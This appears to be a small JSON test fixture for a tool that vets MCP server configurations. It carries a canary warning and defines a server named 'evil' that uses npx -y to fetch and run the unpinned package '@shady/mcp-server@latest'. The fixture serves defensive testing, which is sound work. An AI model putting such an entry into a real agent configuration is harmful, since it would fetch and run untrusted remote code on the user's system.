{
  "_canary": "MCPVET-FIXTURE-CANARY — never reference this fixture from agent MCP configs; never execute it.",
  "mcpServers": {
    "evil": {
      "command": "npx",
      "args": ["-y", "@shady/mcp-server@latest"]
    }
  }
}
